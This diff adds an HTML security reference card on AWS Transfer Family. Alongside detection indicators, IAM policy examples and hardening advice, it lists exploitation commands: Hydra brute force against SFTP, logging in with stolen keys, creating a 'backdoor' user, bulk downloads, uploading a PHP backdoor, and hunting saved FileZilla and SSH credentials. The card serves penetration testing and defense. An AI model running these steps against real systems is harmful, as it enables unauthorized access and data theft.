@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Transfer Family Security | AWS Security Cards</title>
+<meta name="description" content="AWS Transfer Family provides managed SFTP, FTPS, FTP, and AS2 servers for file transfers to and from S3 or EFS. User credentials map to IAM roles for S3 access. Attackers target weak authentication, credential theft, and the underlying storage.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/transferfamily-card.webp" alt="AWS Transfer Family Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/transferfamily.svg" alt="AWS Transfer Family Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Transfer Family Security</span>
+        <span class="header-badge">MANAGED FILE TRANSFER</span>
+      </div>
+      <p class="header-desc">AWS Transfer Family provides managed SFTP, FTPS, FTP, and AS2 servers for file transfers to and from S3 or EFS. User credentials map to IAM roles for S3 access. Attackers target weak authentication, credential theft, and the underlying storage.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">4 Protocols</div>
+          <div class="stat-label">SFTP/FTPS/FTP/AS2</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">S3/EFS</div>
+          <div class="stat-label">Backend Storage</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">IAM Roles</div>
+          <div class="stat-label">User Access</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Protocol Support</h4>
+          <p>Transfer Family supports SFTP (SSH File Transfer Protocol), FTPS (FTP over TLS), FTP (unencrypted), and AS2 (B2B messaging). Each server can be configured with public or VPC endpoints for access control.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> FTP transmits credentials in cleartext - network sniffing or protocol downgrade attacks are viable</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">User Authentication</h4>
+          <p>Users authenticate via SSH keys, passwords, or custom identity providers (Lambda/API Gateway). Each user maps to an IAM role that controls S3/EFS access. Home directories scope user access to specific paths.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Overly permissive IAM roles or weak home directory scoping allows access beyond intended paths</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 75%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">7.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Transfer Family exposes file transfer protocols to external users and partners. Compromised credentials provide direct access to S3 buckets or EFS file systems. The IAM role assumed by users can enable privilege escalation if misconfigured.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Credential Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Brute force SSH/SFTP passwords</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal SSH private keys from compromised systems</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Credential stuffing against user accounts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit weak custom identity provider</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Intercept FTP credentials on network</li></ul><h4 style="color: #f87171;">Protocol &amp; Access Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Protocol downgrade from SFTP to FTP</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Path traversal beyond home directory</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Assume overprivileged IAM role via user</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access sensitive files in S3/EFS backend</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exfiltrate data through file transfers</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Authentication Weaknesses</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> FTP protocol enabled (unencrypted)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Weak passwords allowed</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> SSH keys without passphrase</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Custom identity provider returns overprivileged role</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing multi-factor authentication</li></ul><h4 style="color: #fb923c;">Access Control Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> User IAM role with s3:* permissions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing home directory restrictions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 bucket allows ListBucket without prefix</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EFS not encrypted at rest</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public endpoint without IP allowlisting</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Transfer Servers</div>
+          <pre><code>aws transfer list-servers</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Server Configuration</div>
+          <pre><code>aws transfer describe-server \\
+  --server-id s-1234567890abcdef0</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Users on Server</div>
+          <pre><code>aws transfer list-users \\
+  --server-id s-1234567890abcdef0</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe User (Get IAM Role)</div>
+          <pre><code>aws transfer describe-user \\
+  --server-id s-1234567890abcdef0 \\
+  --user-name ftpuser</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Server SSH Host Keys</div>
+          <pre><code>aws transfer describe-server \\
+  --server-id s-1234567890abcdef0 \\
+  --query 'Server.HostKeyFingerprint'</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #34d39933;">
+        <h3 style="color: #34d399;">🔑 Credential Theft &amp; Abuse</h3><h4 style="color: #34d399;">Credential Sources</h4><ul><li><span class="bullet" style="color: #34d399;">&#x2022;</span> SSH private keys in ~/.ssh directories</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> FileZilla/WinSCP saved credentials</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Environment variables with passwords</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> CI/CD pipeline SFTP configurations</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Partner portal password storage</li></ul><h4 style="color: #34d399;">Post-Compromise Actions</h4><ul><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Connect via SFTP with stolen credentials</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Access mapped S3 bucket contents</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Upload malicious files (ransomware/backdoors)</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Download sensitive data files</li><li><span class="bullet" style="color: #34d399;">&#x2022;</span> Pivot to other resources via IAM role</li></ul><div class="note"><strong>Quick Win:</strong> Check ~/.ssh/config and FileZilla sitemanager.xml for saved Transfer Family credentials.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">👤 IAM Role Exploitation</h3><h4 style="color: #facc15;">Overprivileged Roles</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> User role with full S3 access (s3:*)</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Role can access buckets beyond home directory</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Cross-account S3 access enabled</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Role has iam:PassRole for escalation</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Attached policies allow other services</li></ul><h4 style="color: #facc15;">Role Abuse Techniques</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> List all accessible S3 buckets via SFTP</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Download files from unintended paths</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Upload to shared/public S3 paths</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access other AWS services if role permits</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Enumerate role permissions through API</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeServer - server enumeration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ListUsers - user enumeration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateUser - new user creation</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateUser - user modification</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteUser - user deletion</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Failed authentication attempts spike</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Logins from unusual IP addresses</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Large file transfers at odd hours</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Access to files outside home directory</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New users created without change ticket</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Connect via SFTP</div>
+          <pre><code>sftp -i ~/.ssh/stolen_key \\
+  ftpuser@s-1234567890abcdef0.server.transfer.us-east-1.amazonaws.com</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Test Credentials with sshpass</div>
+          <pre><code>sshpass -p 'password123' sftp \\
+  ftpuser@s-xxx.server.transfer.us-east-1.amazonaws.com</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Server Details (Recon)</div>
+          <pre><code>aws transfer describe-server \\
+  --server-id s-1234567890abcdef0 \\
+  --query 'Server.{Protocols:Protocols,Endpoint:EndpointType,Identity:IdentityProviderType}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get User IAM Role ARN</div>
+          <pre><code>aws transfer describe-user \\
+  --server-id s-xxx \\
+  --user-name ftpuser \\
+  --query 'User.Role'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Brute Force with Hydra</div>
+          <pre><code>hydra -L users.txt -P passwords.txt \\
+  sftp://s-xxx.server.transfer.us-east-1.amazonaws.com</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create Backdoor User</div>
+          <pre><code>aws transfer create-user \\
+  --server-id s-xxx \\
+  --user-name backdoor \\
+  --role arn:aws:iam::ACCOUNT:role/TransferRole \\
+  --ssh-public-key-body &quot;ssh-rsa AAAA...&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Download All Files Recursively</div>
+          <pre><code># After SFTP connection
+sftp&gt; get -r /</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Upload Malicious File</div>
+          <pre><code># After SFTP connection
+sftp&gt; put backdoor.php /var/www/html/</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Accessible Directories</div>
+          <pre><code># After SFTP connection
+sftp&gt; ls -la /
+sftp&gt; ls -la ..</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Check for Path Traversal</div>
+          <pre><code># After SFTP connection
+sftp&gt; cd ../../../
+sftp&gt; ls -la</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full S3 Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;s3:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">User can access any S3 bucket, not just their intended home directory</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped S3 Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;s3:GetObject&quot;, &quot;s3:PutObject&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:s3:::bucket/home/\${transfer:UserName}/*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">User can only access their specific home directory using session variable</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - ListBucket Without Prefix</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;s3:ListBucket&quot;,
+    &quot;Resource&quot;: &quot;arn:aws:s3:::company-data&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">User can list entire bucket contents, discovering all files</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped ListBucket</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;s3:ListBucket&quot;,
+    &quot;Resource&quot;: &quot;arn:aws:s3:::company-data&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringLike&quot;: {
+        &quot;s3:prefix&quot;: &quot;home/\${transfer:UserName}/*&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">User can only list their home directory, not other paths</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Disable FTP Protocol</h4>
+              <p>Only enable SFTP or FTPS to ensure encrypted credential transmission.</p>
+              <pre><code>aws transfer update-server \\
+  --server-id s-xxx \\
+  --protocols SFTP</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📁</span>
+            <div>
+              <h4>Enforce Home Directory Scoping</h4>
+              <p>Use logical directory mappings to restrict user access to specific paths.</p>
+              <pre><code>&quot;HomeDirectoryMappings&quot;: [{
+  &quot;Entry&quot;: &quot;/&quot;,
+  &quot;Target&quot;: &quot;/bucket/home/\${transfer:UserName}&quot;
+}]</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Use SSH Key Authentication Only</h4>
+              <p>Disable password authentication and require SSH key pairs.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>Deploy VPC Endpoint</h4>
+              <p>Use VPC endpoint instead of public endpoint to limit network exposure.</p>
+              <pre><code>--endpoint-type VPC \\
+--vpc-id vpc-xxx \\
+--subnet-ids subnet-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Enable Structured Logging</h4>
+              <p>Enable CloudWatch logging for all file operations and authentication events.</p>
+              <pre><code>--structured-log-destinations \\
+  arn:aws:logs:us-east-1:ACCOUNT:log-group:/aws/transfer/s-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Implement IP Allowlisting</h4>
+              <p>Use security groups or Network ACLs to restrict source IP addresses.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Transfer Family Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
